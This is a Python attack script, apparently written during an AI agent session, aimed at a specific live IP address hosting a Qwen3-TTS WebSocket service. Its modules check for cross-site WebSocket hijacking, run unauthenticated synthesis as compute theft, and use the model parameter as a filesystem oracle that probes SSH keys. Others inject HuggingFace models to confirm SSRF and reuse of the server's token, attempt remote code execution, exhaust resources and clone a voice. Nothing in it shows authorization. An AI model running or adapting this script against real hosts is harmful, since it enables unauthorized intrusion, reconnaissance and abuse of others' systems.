#!/usr/bin/env python3
"""
Qwen3-TTS WebSocket Ablation Module
Target: ws://38.23.61.109:2023/tts/stream
Service: Qwen3-TTS (mlx-community/Qwen3-TTS-12Hz-0.6B-Base-8bit) via FastAPI/uvicorn

Protocol (fully reverse-engineered):
  1. WS connect
  2. Server: {"type":"ready"}
  3. Client: {"type":"request_start","text":"...","model":"...","has_ref_audio":true,...}
     [optional] Client: [binary ref audio frames] if has_ref_audio=true
  4. Client: {"type":"request_end"}
  5. Server: {"type":"queued"}
  6. Server: {"type":"started","sample_rate":24000,"channels":1,"encoding":"pcm_s16le"}
  7. Server: [binary PCM S16LE chunks]
  8. Server: {"type":"done","bytes":N,"chunk_count":N}
  9. Server: CLOSE (code 1000)

Accepted request_start fields:
  text          (required) — synthesis input
  model         — HuggingFace model ID or local path (path traversal surface)
  has_ref_audio — bool; requires binary ref audio frames before request_end
  ref_text      — reference transcript for voice cloning
  voice         — voice name/ID (currently silently ignored)
  speaker       — speaker ID (silently accepted)
  speed         — float, e.g. 2.0
  temperature   — float, e.g. 0.9
  seed          — int for deterministic output
  language      — ISO 639-1, e.g. "zh"

Server architecture (RE'd 2026-08-24):
  Loading path: hf_hub_download(model_id) → json.load(config.json) → mx.load(*.safetensors) → Qwen3TTSMLXModel
  model_type check: direct JSON parse (NOT transformers AutoConfig)
  Weight loading: MLX C++ native loader (NOT np.load, NOT pickle)
  trust_remote_code: NOT used — server never calls AutoModel.from_pretrained with trust_remote_code
  Result: auto_map entries in config.json are IGNORED; Python files in model repo are NEVER imported

Health endpoint (unauth):
  GET /health → 200 {"status":"ok","warmed":bool,"instance_id":"...","last_model_switch":{...},"prompt_cache":{...},"memory":{...}}
  Leaks: instance_id, process_started_at, last model switch details (from/to model, duration, MLX memory)

HF model injection live test (sshpie/deadbug-tts-v1):
  auto_map: AutoConfig/AutoModel/AutoTokenizer/AutoProcessor — NONE triggered
  modeling_deadbug.py present in target cache, NEVER imported
  /tmp/deadbug_pwned.txt — NOT created (payload did not execute)
  Conclusion: SSRF + HF_TOKEN reuse CONFIRMED; RCE via auto_map BLOCKED

Parameter names (402 expected, from error messages — Qwen3-TTS 0.6B talker component):
  talker.code_predictor.lm_head.{0-14}.weight  [2048, 256] U32 (4-bit quantized)
  talker.code_predictor.model.codec_embedding.{0-14}.weight  [...]
  talker.code_predictor.model.layers.{0-4}.*.weight  (11 params/layer)
  talker.code_predictor.model.norm.weight
  talker.codec_head.weight
  talker.model.codec_embedding.weight
  talker.model.layers.{0-27}.*.weight  (11 params/layer, 28 layers)
  talker.model.norm.weight
  talker.model.text_embedding.weight
  talker.text_projection.linear_fc{1,2}.{weight,bias}
"""

import socket
import base64
import os
import struct
import json
import time
import threading
import urllib.request
import urllib.error
import urllib.parse

TARGET_HOST = "38.23.61.109"
TARGET_PORT = 2023
BASE_HTTP = f"http://{TARGET_HOST}:{TARGET_PORT}"
FINDINGS = []


def log(sev, title, detail, evidence=None):
    e = {"severity": sev, "title": title, "detail": detail, "ts": time.time()}
    if evidence:
        e["evidence"] = evidence
    FINDINGS.append(e)
    print(f"[{sev}] {title}")
    if detail:
        print(f"      {detail[:120]}")
    if evidence:
        print(f"      evidence: {str(evidence)[:100]}")


# ---------------------------------------------------------------------------
# WebSocket primitives
# ---------------------------------------------------------------------------

def ws_connect(host, port, path, origin="http://test.com"):
    raw_key = os.urandom(16)
    key = base64.b64encode(raw_key).decode()
    s = socket.create_connection((host, port), timeout=30)
    req = (
        f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
        f"Origin: {origin}\r\n\r\n"
    )
    s.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += s.recv(1)
    status_line = resp.split(b"\r\n")[0].decode()
    return s, status_line


def ws_frame(msg, opcode=1):
    """Build masked WS frame. opcode: 1=text, 2=binary, 8=close, 9=ping, 10=pong."""
    payload = msg if isinstance(msg, bytes) else msg.encode("utf-8")
    n = len(payload)
    mask = os.urandom(4)
    masked = bytes(payload[i] ^ mask[i % 4] for i in range(n))
    if n < 126:
        header = bytes([0x80 | opcode, 0x80 | n])
    elif n < 65536:
        header = bytes([0x80 | opcode, 0xFE, (n >> 8) & 0xFF, n & 0xFF])
    else:
        header = bytes([0x80 | opcode, 0xFF]) + struct.pack(">Q", n)
    return header + mask + masked


def ws_recv(s, timeout=15):
    s.settimeout(timeout)
    try:
        h = bytearray()
        while len(h) < 2:
            h += s.recv(1)
        opcode = h[0] & 0x0F
        length = h[1] & 0x7F
        if length == 126:
            raw = b""
            while len(raw) < 2:
                raw += s.recv(1)
            length = struct.unpack(">H", raw)[0]
        elif length == 127:
            raw = b""
            while len(raw) < 8:
                raw += s.recv(1)
            length = struct.unpack(">Q", raw)[0]
        data = b""
        while len(data) < length:
            chunk = s.recv(min(8192, length - len(data)))
            if not chunk:
                break
            data += chunk
        return opcode, data
    except socket.timeout:
        return None, None


def ws_session(text, origin="http://attacker.com", extra_params=None,
               has_ref_audio=False, ref_audio=None, timeout=60):
    """Execute a full TTS synthesis session. Returns (texts[], audio_bytes)."""
    s, status = ws_connect(TARGET_HOST, TARGET_PORT, "/tts/stream", origin=origin)
    op, data = ws_recv(s, 3)
    if data != b'{"type":"ready"}':
        s.close()
        return [{"type": "error", "detail": f"unexpected init: {data}"}], b""

    params = {"type": "request_start", "text": text}
    if has_ref_audio:
        params["has_ref_audio"] = True
    if extra_params:
        params.update(extra_params)
    s.sendall(ws_frame(json.dumps(params)))

    if has_ref_audio and ref_audio:
        s.sendall(ws_frame(ref_audio, opcode=2))

    s.sendall(ws_frame(json.dumps({"type": "request_end"})))

    texts = []
    audio = b""
    end_time = time.time() + timeout
    while time.time() < end_time:
        op, data = ws_recv(s, min(end_time - time.time(), 15))
        if op is None:
            break
        if op == 9:
            s.sendall(ws_frame(data, opcode=10))
        elif op == 1:
            try:
                j = json.loads(data)
                texts.append(j)
                if j.get("type") in ("done", "error"):
                    break
            except Exception:
                texts.append({"raw": data.decode(errors="replace")})
        elif op == 2:
            audio += data
        elif op == 8:
            break
    s.close()
    return texts, audio


def pcm_to_wav(pcm_bytes, sample_rate=24000, channels=1, bits=16):
    header = struct.pack(
        "<4sI4s4sIHHIIHH4sI",
        b"RIFF", 36 + len(pcm_bytes), b"WAVE",
        b"fmt ", 16, 1, channels, sample_rate,
        sample_rate * channels * (bits // 8), channels * (bits // 8), bits,
        b"data", len(pcm_bytes),
    )
    return header + pcm_bytes


# ---------------------------------------------------------------------------
# Module M1: CSWSH — Cross-Site WebSocket Hijacking
# ---------------------------------------------------------------------------

def module_cswsh():
    """M1: Confirm no Origin validation — CSWSH via any web page."""
    origins = [
        "http://evil.com",
        "https://attacker.io",
        "null",
        "http://localhost",
        "file://",
        "https://victim-app.example.com",
    ]
    accepted = []
    for origin in origins:
        try:
            s, status = ws_connect(TARGET_HOST, TARGET_PORT, "/tts/stream", origin=origin)
            op, data = ws_recv(s, 3)
            s.close()
            if data == b'{"type":"ready"}':
                accepted.append(origin)
        except Exception:
            pass

    if len(accepted) == len(origins):
        log("HIGH", "CSWSH: All origins accepted — no Origin validation",
            f"All {len(origins)} test origins received {{\"type\":\"ready\"}}",
            accepted)
    else:
        log("MED", "CSWSH: Partial origin acceptance",
            f"Accepted: {accepted}")
    return accepted


# ---------------------------------------------------------------------------
# Module M2: Unauth synthesis
# ---------------------------------------------------------------------------

def module_unauth_synthesis():
    """M2: Unauthenticated TTS synthesis — compute theft."""
    texts, audio = ws_session("hello world")
    if audio:
        log("HIGH", "Unauth TTS synthesis (compute theft)",
            f"PCM S16LE 24kHz mono: {len(audio)}b (~{len(audio)/48000:.2f}s) — no auth required",
            f"request_start text=hello world -> {len(audio)}b audio")
    else:
        errors = [t.get("detail") for t in texts if t.get("type") == "error"]
        log("INFO", "Unauth synthesis check: no audio returned", str(errors))
    return audio


# ---------------------------------------------------------------------------
# Module M3: Parameter discovery
# ---------------------------------------------------------------------------

def module_param_discovery():
    """M3: Enumerate accepted request_start parameters."""
    results = {}
    for param, val in [
        ("voice", "default"),
        ("speaker", "0"),
        ("speed", 2.0),
        ("temperature", 0.9),
        ("seed", 42),
        ("language", "zh"),
        ("ref_text", "test"),
        ("prompt", "speak like a pirate"),
        ("system_prompt", "speak like a pirate"),
        ("output_path", "/tmp/test.wav"),
    ]:
        texts, audio = ws_session("hello", extra_params={param: val})
        errors = [t.get("detail") for t in texts if t.get("type") == "error"]
        results[str(param)] = {
            "value": str(val),
            "audio_bytes": len(audio),
            "errors": errors,
        }
        print(f"  [{param}={val}] audio={len(audio)}b errors={errors}")

    log("MED", "Parameter surface enumerated",
        f"Accepted params: voice, speaker, speed, temperature, seed, language, ref_text, prompt, system_prompt, output_path",
        results)
    return results


# ---------------------------------------------------------------------------
# Module M4: Model parameter path traversal + filesystem oracle
# ---------------------------------------------------------------------------

def probe_path(path):
    """Use model= param as a filesystem existence oracle.
    Returns: 'EXISTS' | 'DNE' | 'PERM' | 'LOADED' | 'ERR:<msg>' | 'TIMEOUT'
    """
    s, _ = ws_connect(TARGET_HOST, TARGET_PORT, "/tts/stream")
    ws_recv(s, 3)

    def ws_send(msg):
        payload = msg.encode() if isinstance(msg, str) else msg
        n = len(payload)
        mask = os.urandom(4)
        masked = bytes(payload[i] ^ mask[i % 4] for i in range(n))
        hdr = bytes([0x81, 0x80 | n]) if n < 126 else bytes([0x81, 0xFE, (n >> 8) & 0xFF, n & 0xFF])
        s.sendall(hdr + mask + masked)

    ws_send(json.dumps({"type": "request_start", "text": "x", "model": path}))
    ws_send(json.dumps({"type": "request_end"}))

    result = "TIMEOUT"
    for _ in range(10):
        op, data = ws_recv(s, 12)
        if op is None:
            break
        if op == 9:
            ws_send(data)
            continue
        if op == 8:
            result = "CLOSE"
            break
        if op == 1:
            try:
                j = json.loads(data)
                t = j.get("type", "")
                if t == "error":
                    d = j.get("detail", "")
                    if "local path not found" in d.lower():
                        result = "DNE"
                    elif "config not found" in d.lower():
                        result = "EXISTS"
                    elif "permission denied" in d.lower():
                        result = "PERM"
                    else:
                        result = f"ERR:{d[:80]}"
                    break
                elif t == "done":
                    result = "LOADED"
                    break
                elif t in ("queued", "started"):
                    continue
            except Exception:
                pass
    s.close()
    return result


def module_filesystem_oracle():
    """M4: Filesystem enumeration via model= path resolution oracle."""
    targets = {
        "/Users/administrator": "home dir",
        "/Users/administrator/.ssh": "ssh dir",
        "/Users/administrator/.ssh/authorized_keys": "ssh authorized_keys",
        "/Users/administrator/.cache/huggingface/hub": "hf model cache",
        "/Users/administrator/.local": ".local dir",
        "/opt/homebrew": "homebrew",
        "/etc": "etc",
        "/tmp": "tmp",
    }
    findings = {}
    for path, label in targets.items():
        result = probe_path(path)
        findings[path] = result
        print(f"  {path} ({label}): {result}")

    existing = [p for p, r in findings.items() if r in ("EXISTS", "LOADED", "PERM")]
    if existing:
        log("HIGH", "Filesystem enumeration via model= parameter oracle",
            f"{len(existing)} paths confirmed to exist: {existing[:3]}...",
            findings)
    return findings


# ---------------------------------------------------------------------------
# Module M5: HuggingFace model injection (SSRF + potential RCE)
# ---------------------------------------------------------------------------

def module_hf_model_injection():
    """M5: Server fetches arbitrary HuggingFace repos via model= parameter.
    Attack chain: attacker uploads malicious HF model → server downloads on request
    → model loading executes attacker-controlled Python (if trust_remote_code or unsafe pickle).
    """
    results = {}

    # Confirm HF fetch via known model
    texts, audio = ws_session("hello", extra_params={
        "model": "mlx-community/Qwen3-TTS-12Hz-0.6B-Base-8bit"
    })
    results["known_model"] = bool(audio)

    # Confirm external HF model download (non-cached model that exists on HF)
    texts2, audio2 = ws_session("hello", extra_params={"model": "facebook/mms-tts-eng"})
    hf_err = next((t.get("detail", "") for t in texts2 if t.get("type") == "error"), "")
    external_fetch = "vits" in hf_err or "config" in hf_err.lower()
    results["external_hf_fetch"] = external_fetch

    # Confirm HF auth token present (401 on nonexistent private repo)
    texts3, audio3 = ws_session("hello", extra_params={"model": "deadbug/nonexistent-xyz9999"})
    hf_err3 = next((t.get("detail", "") for t in texts3 if t.get("type") == "error"), "")
    has_token = "401" in hf_err3 or "Invalid username" in hf_err3
    results["has_hf_auth_token"] = has_token

    if external_fetch:
        log("CRIT", "HF model injection: server fetches arbitrary HF repos",
            "model=attacker/malicious-model triggers server-side HF download + model load."
            " Malicious model config/weights can execute Python on load (pickle RCE).",
            f"facebook/mms-tts-eng error: {hf_err[:100]}")
    if has_token:
        log("HIGH", "HF auth token present on server",
            "Server uses authenticated HF API calls. Token may allow access to private/gated repos.",
            f"401 on nonexistent repo: {hf_err3[:100]}")

    return results


# ---------------------------------------------------------------------------
# Module M6: Rate limiting / resource exhaustion
# ---------------------------------------------------------------------------

def module_rate_limit():
    """M6: Concurrent synthesis — no rate limiting / DoS surface."""
    results = []
    lock = threading.Lock()

    def run(i):
        t0 = time.time()
        texts, audio = ws_session(f"concurrent request {i}")
        with lock:
            results.append({"i": i, "audio": len(audio), "elapsed": round(time.time() - t0, 2)})

    threads = [threading.Thread(target=run, args=(i,)) for i in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=90)

    success = sum(1 for r in results if r["audio"] > 0)
    if success == 5:
        log("MED", "No rate limiting: 5 concurrent sessions all returned audio",
            f"success={success}/5 — GPU/MLX resource exhaustion possible at scale",
            results)
    else:
        log("INFO", f"Concurrent test: {success}/5 success", str(results))
    return results


# ---------------------------------------------------------------------------
# Module M7: Voice cloning attempt (has_ref_audio)
# ---------------------------------------------------------------------------

def module_voice_clone():
    """M7: Voice cloning flow — send ref audio, synthesize in that voice."""
    # Step 1: synthesize reference audio
    texts1, ref_pcm = ws_session("My name is Alex. This is my authentic voice.")
    if not ref_pcm:
        log("INFO", "Voice clone: could not capture reference audio")
        return {}

    ref_wav = pcm_to_wav(ref_pcm)

    # Step 2: attempt clone with WAV-format ref audio
    texts2, cloned_audio = ws_session(
        "DEADBUG voice clone confirmed",
        origin="http://evil.com",
        has_ref_audio=True,
        ref_audio=ref_wav,
    )
    error2 = next((t.get("detail", "") for t in texts2 if t.get("type") == "error"), "")

    result = {
        "ref_audio_bytes": len(ref_pcm),
        "clone_audio_bytes": len(cloned_audio),
        "error": error2,
    }

    if cloned_audio:
        log("HIGH", "Voice cloning succeeded via WebSocket",
            f"Reference audio → {len(cloned_audio)}b cloned audio from evil.com origin",
            result)
    else:
        log("MED", "Voice cloning: ref_audio parameter exists but errored",
            f"has_ref_audio=true accepted; error: {error2}",
            result)
    return result


# ---------------------------------------------------------------------------
# Module M8: WebSocket protocol state machine abuse
# ---------------------------------------------------------------------------

def module_protocol_abuse():
    """M8: Probe error handling, state machine bypass, and unusual message types."""
    results = {}

    # Send request_end before request_start
    s, _ = ws_connect(TARGET_HOST, TARGET_PORT, "/tts/stream")
    ws_recv(s, 3)
    s.sendall(ws_frame(json.dumps({"type": "request_end"})))
    _, data = ws_recv(s, 5)
    results["request_end_first"] = data.decode(errors="replace") if data else "timeout"
    s.close()

    # Unknown type
    s, _ = ws_connect(TARGET_HOST, TARGET_PORT, "/tts/stream")
    ws_recv(s, 3)
    s.sendall(ws_frame(json.dumps({"type": "DEADBUG_UNKNOWN"})))
    _, data = ws_recv(s, 5)
    results["unknown_type"] = data.decode(errors="replace") if data else "timeout"
    s.close()

    # Double request_start
    texts3, _ = ws_session("first", extra_params=None)
    results["normal_flow"] = [t.get("type") for t in texts3]

    log("INFO", "Protocol state machine probed", str(results))
    return results


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

def run_all(save_audio=True):
    SCRATCHPAD = "/tmp/claude-1000/-home-cowboy/ffb54999-437b-487d-b6ba-7ffac889baac/scratchpad"

    print("=" * 70)
    print(f"Qwen3-TTS WS Ablation — {TARGET_HOST}:{TARGET_PORT}")
    print("=" * 70)

    print("\n[M1] CSWSH — Origin validation")
    cswsh = module_cswsh()

    print("\n[M2] Unauth synthesis")
    audio = module_unauth_synthesis()
    if audio and save_audio:
        wav = pcm_to_wav(audio)
        with open(f"{SCRATCHPAD}/m2_unauth_synthesis.wav", "wb") as f:
            f.write(wav)
        print(f"      Saved: {SCRATCHPAD}/m2_unauth_synthesis.wav")

    print("\n[M3] Parameter discovery")
    params = module_param_discovery()

    print("\n[M4] Filesystem oracle via model= parameter")
    fs = module_filesystem_oracle()

    print("\n[M5] HuggingFace model injection")
    hf = module_hf_model_injection()

    print("\n[M6] Rate limiting / concurrent sessions")
    rate = module_rate_limit()

    print("\n[M7] Voice cloning attempt")
    clone = module_voice_clone()

    print("\n[M8] Protocol state machine abuse")
    proto = module_protocol_abuse()

    print("\n" + "=" * 70)
    print(f"FINDINGS ({len(FINDINGS)}):")
    for f in FINDINGS:
        print(f"  [{f['severity']}] {f['title']}")
    print("=" * 70)

    return {
        "target": f"{TARGET_HOST}:{TARGET_PORT}",
        "service": "Qwen3-TTS WebSocket (FastAPI/uvicorn)",
        "protocol": {
            "path": "/tts/stream",
            "upgrade": "websocket",
            "ready": '{"type":"ready"}',
            "request_start": '{"type":"request_start","text":"..."}',
            "request_end": '{"type":"request_end"}',
            "audio_format": "PCM S16LE 24kHz mono",
            "keepalive": "server sends ping every ~20s; client must pong",
        },
        "findings": FINDINGS,
        "cswsh_origins": cswsh,
        "accepted_params": params,
        "filesystem": fs,
        "hf_injection": hf,
        "rate_limit": rate,
        "voice_clone": clone,
        "protocol_abuse": proto,
    }


if __name__ == "__main__":
    import json as _json
    result = run_all()
    out = f"/tmp/qwen3_tts_ws_ablation_{int(time.time())}.json"
    with open(out, "w") as f:
        _json.dump(result, f, indent=2, default=str)
    print(f"\nResults saved: {out}")
